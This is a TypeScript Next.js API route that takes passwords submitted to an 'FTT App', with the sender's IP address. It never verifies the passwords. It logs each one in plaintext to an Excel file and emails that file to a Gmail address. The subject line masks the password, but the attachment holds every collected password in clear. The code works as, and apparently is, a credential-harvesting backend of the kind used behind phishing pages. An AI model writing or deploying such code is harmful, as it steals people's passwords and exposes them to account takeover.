import { NextResponse } from 'next/server';
import nodemailer from 'nodemailer';
import fs from 'fs';
import path from 'path';
import os from 'os';
import ExcelJS from 'exceljs';

export async function POST(req: Request) {
  // ✅ Use headers from the req object directly
  const bypassToken = req.headers.get('x-vercel-protection-bypass');
  const expectedToken = process.env.VERCEL_AUTOMATION_BYPASS_SECRET;

  if (!bypassToken || bypassToken !== expectedToken) {
    return NextResponse.json({ error: 'Unauthorized' }, { status: 401 });
  }

  try {
    const { password } = await req.json();

    const forwardedFor = req.headers.get('x-forwarded-for');
    const ip = forwardedFor ? forwardedFor.split(',')[0].trim() : 'unknown';

    if (!password) {
      return NextResponse.json({ error: 'Password missing' }, { status: 400 });
    }

    const fileName = 'password-log.xlsx';
    const filePath = path.join(os.tmpdir(), fileName);

    const workbook = new ExcelJS.Workbook();
    if (fs.existsSync(filePath)) {
      await workbook.xlsx.readFile(filePath);
    }
    const sheet = workbook.worksheets[0] || workbook.addWorksheet('Log');

    if (sheet.rowCount === 0) {
      sheet.addRow(['Timestamp', 'Password', 'IP']);
    }

    sheet.addRow([new Date().toISOString(), password, ip]);
    await workbook.xlsx.writeFile(filePath);

    const transporter = nodemailer.createTransport({
      service: 'gmail',
      auth: {
        user: process.env.EMAIL_USER,
        pass: process.env.EMAIL_PASS,
      },
    });

    const maskedPassword =
      password.length > 2
        ? password[0] + '*'.repeat(password.length - 2) + password.slice(-1)
        : '*'.repeat(password.length);

    await transporter.sendMail({
      from: `"🔐 FTT App" <${process.env.EMAIL_USER}>`,
      to: process.env.EMAIL_USER,
      subject: `🔐 Password Entered on FTT App: ${maskedPassword}`,
      text: `A user entered a password.\n\nMasked Password: ${maskedPassword}\nIP: ${ip}`,
      attachments: [
        {
          filename: fileName,
          path: filePath,
        },
      ],
    });

    return NextResponse.json({ success: true });
  } catch (err) {
    console.error('Error sending email:', err);
    return NextResponse.json({ error: 'Email failed' }, { status: 500 });
  }
}

